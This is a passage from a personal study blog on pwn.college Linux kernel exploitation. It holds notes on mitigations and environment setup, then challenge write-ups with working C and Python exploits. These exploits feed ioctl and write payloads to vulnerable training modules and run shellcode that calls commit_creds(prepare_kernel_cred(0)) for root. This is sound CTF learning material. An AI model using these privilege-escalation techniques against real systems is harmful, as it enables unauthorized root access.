id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h5><p><a href="https://docs.google.com/presentation/d/1tcR4YsVhN2kVUfe8RJw56dtSs-QOwp4-g8qgI0Q3kFM/edit#slide=id.g75a3c0c177_2_16">SLIDE</a>. in make_root.c.</p><h5 id="Escape-Seccomp"><a href="#Escape-Seccomp" class="headerlink" title="Escape Seccomp"></a>Escape Seccomp</h5><p><a href="https://docs.google.com/presentation/d/1YMlOERClX6Yi8Fb9DYxBBJ5MYB1C-_F75XKkoSmbl8k/edit#slide=id.ga2eb818465_0_0">SLIDE</a> </p><p>mainly disable <code>TIF_SECCOMP</code> bit. all in SLIDES.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> &#123;</span><br>    <span class="hljs-comment">// LOTS of stuff, including</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">cred</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> <span class="hljs-title">thread_info</span>;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> &#123;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> flags;<span class="hljs-comment">/* low level flags */</span><br>    u32 status;<span class="hljs-comment">/* thread synchronous flags */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>Yan demonstrates how to use make_root.ko to escape seccomp and escalating privilege.</p><h5 id="memory-managment"><a href="#memory-managment" class="headerlink" title="memory managment"></a>memory managment</h5><ul><li>linux use four level page table:</li></ul><img src="../../image/pwn-modules/image-20220523182826589.png" alt="image-20220523182826589" style="zoom:80%;" /> <ul><li>only lower 48 bits are used in addressing. higher 12bits used to denote the kernel space. and ARM arch take these bits as tag for security concerns. <a href="https://source.android.com/devices/tech/debug/tagged-pointers">android source</a> | <a href="https://llvm.org/devmtg/2018-10/slides/Serebryany-Stepanov-Tsyrklevich-Memory-Tagging-Slides-LLVM-2018.pdf">LLVM memory tagging</a> | </li><li>Virtual Machine isolation: The extended page table.</li><li>MMU + TLB</li><li>other architectures are analogous in <strong>paging</strong>. Linux <em>requires</em> a hardware MMU (although certain forks do not).</li><li><strong>The Old Way</strong>: Old Linuxes could access physical memory via <strong>/dev/mem</strong> as root.<br><strong>The New Way</strong>: If you want to get at physical memory now, you must do it from the <strong>kernel</strong>. Physical memory is mapped <em>contiguously</em> in kernel’s virtual memory space for convenient access. Two macros, <code>phys_to_virt()</code> and <code>virt_to_phys()</code>.</li></ul><h5 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h5><p><a href="https://docs.google.com/presentation/d/1DNxufs_WlQRkzBMjPD7UE1qRrd87XDGpfQSPkiajEyE/edit#slide=id.gfbef220448_0_48">SLIDES</a> many links.</p><ul><li><p><strong>Stack canaries:</strong> leak the canary!<br><strong>kASLR:</strong> leak the kernel base address!<br><strong>Heap/stack regions NX:</strong> ROP!</p></li><li><p>May support Function Granular ASLR.</p></li><li><p>Supervisor Memory Protection:</p><ul><li><strong>SMEP.</strong><br>Prevents kernel-space code from <strong>E</strong>xecuting userspace memory <em>at all ever</em>.</li><li><strong>SMAP.</strong><br>Prevents kernel-space from even <strong>A</strong>ccessing userspace memory <em>unless the AC flag in the RFLAGS register is set</em>. Two ring0 instructions, stac and clac, manage this bit.</li><li>Why separate these? in SLIDES.</li></ul></li></ul><h5 id="kernel-shellcode"><a href="#kernel-shellcode" class="headerlink" title="kernel shellcode"></a>kernel shellcode</h5><ul><li>you cant use syscalls in kernel. just use call instruction with symbol addresses in /proc/kallsyms</li><li>KASLR. if it is on, then I need to find a vulnerability to leak an kernel symbol address.</li><li>indirect calls.</li><li>seccomp escaping: notice gs segment register to figure out where the task struct is.</li><li>The kernel is WAY too complex to figure out offsets manually.<br>Best option:<ol><li>Write a kernel module in C with the actions you want<br>your shellcode to do.</li><li>Build it for the kernel you want to attack (e.g., using<br>the vm build command in pwn.college).</li><li> Reverse-engineer it to see how these actions work in<br>assembly.</li><li>Re-implement that assembly in your shellcode!</li></ol></li><li>be careful with kernel code context! Try to have it act like a normal function and <strong>return</strong> when it’s done.</li></ul><h5 id="Env-setup"><a href="#Env-setup" class="headerlink" title="Env setup"></a>Env setup</h5><p>build for old kernel 5.4: <a href="https://github.com/pwncollege/pwnkernel">set up an environment</a> </p><ul><li>first complie stopping at <code>thunk_64.o</code>, due to missing symbol table.<ul><li>revise <code>linux-5.4/tools/objtool/elf.c</code> line 380 -&gt; <a href="https://www.spinics.net/lists/kernel/msg3797871.html">link</a> </li></ul></li><li>then revise build.sh and take a vm snapshot.</li><li>then revise <code>arch/x86/boot/compressed/pgtable_64.c</code> to fix multiple definitions of <code>__force_order</code>. <a href="https://lkml.org/lkml/2019/12/21/121">link</a> </li><li>OK. total size is 4.3G. by <code>du -sh pwnkernel</code> </li></ul><p>VM by qemu: </p><ul><li><p>require: new version of gdb, kernel with debug symbols, ASLR is off(in ./launch there is <code>-append</code> option for qemu, <strong>check its usage</strong>).</p></li><li><p>because the kernel is started with qemu, so can debug with gdb through port 1234.</p><p><code>gdb linux-5.4/vmlinux</code> + <code>target remote :1234</code> (I added it into .gdbinit in pwnkernel/)</p></li><li><p><code>cat /proc/kallsyms</code>  you can see all symbols in kernel. because we disabled the kernel address space randomization, it will always be the same.</p></li><li><p> only a limited number of commands will work in vm. look <code>ls /bin</code> for details. Because the shell is provided by busybox, so there is a lack of functionality.</p></li><li><p>use <code>sh -l</code> or <code>su - ctf</code> to load ~/.profile. there is some convenient aliases.</p></li></ul><p><a href="https://docs.google.com/presentation/d/1Ik7EWjn_9ywzCW3MpJJ0eVdIvhIMP6brObBQQDtYDCo/edit#slide=id.ga548015bd5_0_114">further setup is here</a> </p><p>tips: </p><ul><li>wget command in build.sh has been added with -c option(–continue), which means that it won’t repeat downloadiing when there is an already existing file in the same directory.</li><li><code>mkdir -p</code> no error if existing.</li></ul><h5 id="online-environment"><a href="#online-environment" class="headerlink" title="online environment"></a>online environment</h5><ul><li><code>vm debug</code>: I have no idea about what happened…….it suddenly worked and then shutdown…..</li><li>太蠢了, 全都停不下来. 等会看一下writing kernel shellcode. 没用啊, 难不成全部都变成本地做? 也不是不行就是了…….</li><li> 只是不能debug. 暂未发现解决办法.</li></ul><h4 id="level1-3"><a href="#level1-3" class="headerlink" title="level1"></a>level1</h4><p>.0 level calls <code>printk()</code> function to give some info in kernel ring buffer. Obviously, .1 level doesn’t. </p><p>tested in ipython:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>fd = os.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/proc/pwncollege&#x27;</span>, os.O_RDWR)<br>os.write(fd, <span class="hljs-string">&#x27;password&#x27;</span>)<br>os.read(fd, <span class="hljs-number">60</span>)<br></code></pre></div></td></tr></table></figure><h4 id="level2-3"><a href="#level2-3" class="headerlink" title="level2"></a>level2</h4><p>unlike previous level, there is no device_read() function, rather printk(flag) exists in device_write with password check.</p><p>script is the same way.</p><h4 id="level3-4"><a href="#level3-4" class="headerlink" title="level3"></a>level3</h4><p>the kernel module defines a win() function which will elevate the calling process privilege.</p><p>once pass the check, current process(i.e., ipython), will run as root. then use <code>!cat /flag</code>. everything is done.</p><p>even while the password is for previous level, it just still works……..</p><h4 id="level4-5"><a href="#level4-5" class="headerlink" title="level4"></a>level4</h4><p>hijack the kernel module by <code>ioctl()</code>. it is in python <code>fcntl</code> module. <a href="https://docs.python.org/3.10/library/fcntl.html">doc</a> </p><p>in python fcntl.fcntl() almost equals to fcntl.ioctl(), <strong>except for ioctol’s <em>arg</em> argument can accept <em>bytes</em></strong>.</p><p>script:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> fcntl, os<br>fd = os.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/proc/pwncollege&#x27;</span>, os.O_RDWR)<br>fcntl.ioctl(fd, <span class="hljs-number">1337</span>, <span class="hljs-string">b&#x27;ruysmamctudpofzh&#x27;</span>)<br><span class="hljs-comment">#then !cat /flag</span><br></code></pre></div></td></tr></table></figure><h4 id="level5-6"><a href="#level5-6" class="headerlink" title="level5"></a>level5</h4><p>device_ioctl() calls __x86_indirect_thunk_rbx.</p><p>retpoline, __x86_indirect_thunk_rbx……what’re these?</p><p><a href="https://elixir.bootlin.com/linux/v5.4/source/arch/x86/lib/retpoline.S#L11">here</a> it is(<a href="https://stackoverflow.com/questions/48089426/what-is-a-retpoline-and-how-does-it-work">here</a> is repoline and google’s <a href="https://support.google.com/faqs/answer/7625886">article</a>). when debugging, I find that it just merely jumps to the address the register(<strong>rbx</strong>) points to. so many nested macros in kernel code…..</p><p>ATTENTION: The following piece of code in fact create a function, and in kernel module it calls the it. Thus module will push return address onto stack and when returning from the <em>THUNK</em>  function it’ll come back to complete the rest of cleanups.</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">GENERATE_THUNK(_ASM_BX)<br>↘<br>#define __EXPORT_THUNK(sym) _ASM_NOKPROBE(sym); EXPORT_SYMBOL(sym)<br>#define EXPORT_THUNK(reg) __EXPORT_THUNK(__x86_indirect_thunk_ ## reg)<br>#define GENERATE_THUNK(reg) THUNK reg ; EXPORT_THUNK(reg)<br>↘<br>.macro THUNK reg<br>.section .text.__x86.indirect_thunk<br><br>ENTRY(__x86_indirect_thunk_\reg)<br>CFI_STARTPROC<br>JMP_NOSPEC %\reg  #simply a jmp to shellcode. no change to the stack. <br>#we can directly use ret to come back to module code.<br>CFI_ENDPROC<br>ENDPROC(__x86_indirect_thunk_\reg)<br>.endm<br></code></pre></div></td></tr></table></figure><p>what value dose the rbx hold before execute <code>jmp rbx</code> instruction? it is ioctl()’s <em>arg</em> argument.</p><p>by <code>cat /proc/kallsyms | grep win</code> command,  the win()’s address can be easily found. <code> ffffffffc0000c5d t win  [challenge]</code> </p><p>but in pwn.college….</p><img src="../../image/pwn-modules/image-20220524205647223.png" alt="image-20220524205647223" style="zoom:80%;" /><p>let’s give up this mysterious environment.</p><blockquote><p>Now I know why it would happen……<br>normal user that doesn’t have enough privilege will find all kernel symbols with address 0.<br>then what should i do in pwn.college? emmmmmm<br>maybe i need to grep in practice mode and come back.</p></blockquote><p>script:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    ioctl(fd, <span class="hljs-number">1337</span>, <span class="hljs-number">0xffffffffc0000c5d</span>);<br>    <span class="hljs-comment">//after privilege escalation</span><br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">2</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>I win.</p><img src="../../image/pwn-modules/image-20220524211101441.png" alt="image-20220524211101441" style="zoom:80%;" /><h4 id="level6-6"><a href="#level6-6" class="headerlink" title="level6"></a>level6</h4><p>begin kernel shellcoding!</p><ul><li>at the beginning of module, it calls <code>kmalloc()</code> function to allocate a chunk of virtual address contiguous memory. the details of its argument are waiting to be check.</li><li>when writing to /proc/pwncollege, the device_write() in kernel will call <code>copy_from_user()</code> to copy shellcode from <code>write()</code>‘s buffer argument to <em>shellcode</em> variable. and jmp to shellcode address.</li><li>donot forget to restore kernel’s context after shellcode returns.</li></ul><p>The ciritical point of shellcoding in kernel is we can only call kernel function. here i use <code>prepare_kernel_cred()</code> and <code>commit_cred()</code> to achive privilege escalation.</p><ul><li>two functions’ address:</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /proc/kallsyms | grep -E <span class="hljs-string">&#x27;prepare_kernel_cred|commit_cred&#x27;</span></span><br>ffffffff810892c0 T commit_creds                                   <br>ffffffff810895e0 T prepare_kernel_cred                            <br></code></pre></div></td></tr></table></figure><ul><li>then <code>commit_cred(prepare_kernel_cred(0))</code> </li></ul><p>reassembly code:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">call    _copy_from_user ; PIC mode<br>mov     rbp, rax<br>mov     rax, cs:shellcode<br>call    __x86_indirect_thunk_rax ; PIC mode<br><br>mov     rax, rbx<br>pop     rbx<br>sub     rax, rbp<br>pop     rbp<br>retn<br></code></pre></div></td></tr></table></figure><ol><li>what would happen if device_write() return non-zero? first try to non-restore:</li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor edi, edi</span><br><span class="hljs-string">mov rbx, 0xffffffff810895e0</span><br><span class="hljs-string">call rbx</span><br><span class="hljs-string">mov rdi, rax</span><br><span class="hljs-string">mov rbx, 0xffffffff810892c0</span><br><span class="hljs-string">call rbx</span><br><span class="hljs-string">ret//equals to the ret in device_write()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure><p>The ret instruction equals to the ret in device_write(), and violate the conventions of caller-saved resgiter–rbx. it may crash the kernel. but in practice, it doesn’t.</p><p>script:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-comment">//gernerated with pwnsh</span><br><span class="hljs-keyword">char</span> *shellcode=<span class="hljs-string">&quot;\x31\xff\x48\xc7\xc3\xe0\x95\x08\x81\xff\xd3\x48\x89\xc7\x48\xc7\xc3\xc0\x92\x08\x81\xff\xd3\xc3&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    write(fd, shellcode, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">60</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>win again.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">~ $ ./test                                                                                                        <br>[ 2166.732101] [device_open] inode=ffff888006e33448, file=ffff888006bf7900                                        <br>[ 2166.737393] [device_write] file=ffff888006bf7900, buffer=0000000000481004, length=4096, offset=ffffc900001a7f08<br>pwn_college&#123;what the fuck?&#125;                                                                                       <br>[ 2166.748112] [device_release] inode=ffff888006e33448, file=ffff888006bf7900                                     <br></code></pre></div></td></tr></table></figure><h4 id="level7-5"><a href="#level7-5" class="headerlink" title="level7"></a>level7</h4><p>execute shellcode through ioctl</p><p>after checking the code for a while, I found that it may need to define a struct to wrap up the <em>arg</em> for <code>ioctl()</code>.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">device_ioctl</span><span class="hljs-params">(file *file, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> cmd, <span class="hljs-keyword">char</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">size_t</span> shellcode_length; <span class="hljs-comment">// [rsp+0h] [rbp-28h] BYREF</span><br>  <span class="hljs-keyword">void</span> (*shellcode_execute_addr)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">// [rsp+8h] [rbp-20h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+10h] [rbp-18h]</span><br><br>  v7 = __readgsqword(<span class="hljs-number">0x28</span>u); <span class="hljs-comment">//for canary</span><br>  printk(&amp;unk_A30, file, cmd); <span class="hljs-comment">//nothing</span><br>  result = <span class="hljs-number">-1LL</span>;<br>  <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">1337</span> ) <span class="hljs-comment">//request number must be 1337</span><br>  &#123;<br>    copy_from_user(&amp;shellcode_length, arg, <span class="hljs-number">8LL</span>);<br>    copy_from_user(&amp;shellcode_execute_addr, arg + <span class="hljs-number">4104</span>, <span class="hljs-number">8LL</span>);<br>    <span class="hljs-comment">//the shellcode_length and addr come from the (void*)arg.</span><br>    <span class="hljs-comment">//the maximun len of code is 4104 bytes.</span><br>    result = <span class="hljs-number">-2LL</span>;<br>    <span class="hljs-keyword">if</span> ( shellcode_length &lt;= <span class="hljs-number">0x1000</span> )<br>    &#123;<br>      copy_from_user(shellcode, arg + <span class="hljs-number">8</span>, shellcode_length);<span class="hljs-comment">//copy shellcode.On success will return 0</span><br>      _x86_indirect_thunk_rax(shellcode_execute_addr);<span class="hljs-comment">// jumpto shellcode.</span><br>      result = <span class="hljs-number">0LL</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>the struct may be like:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anonym</span>&#123;</span><br>    <span class="hljs-keyword">long</span> len = <span class="hljs-number">200</span>;<br>    <span class="hljs-keyword">char</span> a[<span class="hljs-number">4104</span>];<br>    <span class="hljs-keyword">void</span>* addr = ?;<br>&#125;test;<br></code></pre></div></td></tr></table></figure><p>code near jmp:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">mov     rdi, cs:shellcode<br>lea     rsi, [arg+8]<br>call    _copy_from_user ; PIC mode<br>mov     rax, [rsp+28h+shellcode_execute_addr]<br>call    __x86_indirect_thunk_rax ; PIC mode<br>xor     eax, eax<br></code></pre></div></td></tr></table></figure><p><del>so i can reuse the rdi as the shellcode address.</del>. emmmmm, use gdb.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">~ $ cat /proc/kallsyms | grep &#x27;device_ioctl&#x27;<br>0xffffffffc000092c t device_ioctl [challenge] <br></code></pre></div></td></tr></table></figure><p>and the kmalloc() address……</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">► <span class="hljs-number">0xffffffffc00009ac</span>    call   _copy_from_user            &lt;_copy_from_user&gt;<br>       rdi: <span class="hljs-number">0xffffc90000045000</span> ◂— <span class="hljs-number">0xffffffffffffffff</span>                       <br>       rsi: <span class="hljs-number">0x4ae388</span> ◂— <span class="hljs-number">0</span>                                                  <br>       rdx: <span class="hljs-number">0x0</span>                                                            <br></code></pre></div></td></tr></table></figure><p>shellcode is same like previous level.</p><p>script:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">char</span> *shellcode=<span class="hljs-string">&quot;\x31\xff\x48\xc7\xc3\xe0\x95\x08\x81\xff\xd3\x48\x89\xc7\x48\xc7\xc3\xc0\x92\x08\x81\xff\xd3\xc3\x00&quot;</span>;<br><span class="hljs-keyword">int</span> shellcode_len = <span class="hljs-number">25</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anonym</span>&#123;</span><br>    <span class="hljs-keyword">long</span> len;<br>    <span class="hljs-keyword">char</span> a[<span class="hljs-number">4096</span>];<br>    <span class="hljs-keyword">void</span>* addr <span class="hljs-comment">/* =? */</span>;<br>&#125;test;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    test.len= shellcode_len;<br>    test.addr = (<span class="hljs-keyword">void</span>*)<span class="hljs-number">0xffffc9000002f000</span>;<br>    <span class="hljs-built_in">memcpy</span>(test.a, shellcode, shellcode_len);<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    ioctl(fd, <span class="hljs-number">1337</span>, &amp;test);<br>    <span class="hljs-comment">//after privilege escalation</span><br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">60</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>still win. but through a stupid way to find kmalloc()’s fixed address…..</p><h4 id="level8-5"><a href="#level8-5" class="headerlink" title="level8"></a>level8</h4><p>this challenge has two files. One for kernel module, the other for user land program to receive shellcode and add seccomp rules to itself(only write syscall is allowed).</p><p>nothing special.</p><h4 id="level9-5"><a href="#level9-5" class="headerlink" title="level9"></a>level9</h4><p>something strange in IDA…</p><p>Okay, just because the misdecompilation of <code>memset(v8, 0, 66)</code>. in mechine code it is <code>rep stod</code> with rcx=66 rdi=dest rax=content. and it need modify the struct name in Structures window.</p><p>we should fill with this structure, and overwrite the function pointer:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">00000000 logggg          struc ; (sizeof=0x108, align=0x8, copyof_570)<br>00000000                                         ; XREF: device_write/r<br>00000000 buffer          db 256 dup(?)<br>00000100 log_function    dq ?                    ; XREF: device_write+4A/w<br>00000100                                         ; device_write:loc_661/r ; offset<br>00000108 logggg          ends<br>00000108<br></code></pre></div></td></tr></table></figure><p>256 bytes shellcode and 8 bytes shellcode begin address.</p><blockquote><p>ATTENTION:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">call    __x86_indirect_thunk_rax ; PIC mode<br></code></pre></div></td></tr></table></figure><p>this is a <em>call</em> instruction, so there is no need for fixing stack context in shellcode. Just simply add ret at the end of it is enough.</p></blockquote><p>this module has local variable space on stack(and canary), so we can use the rdi to restore the stack context and make <code>ret</code> work normally.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//shellcode is also the same.</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span 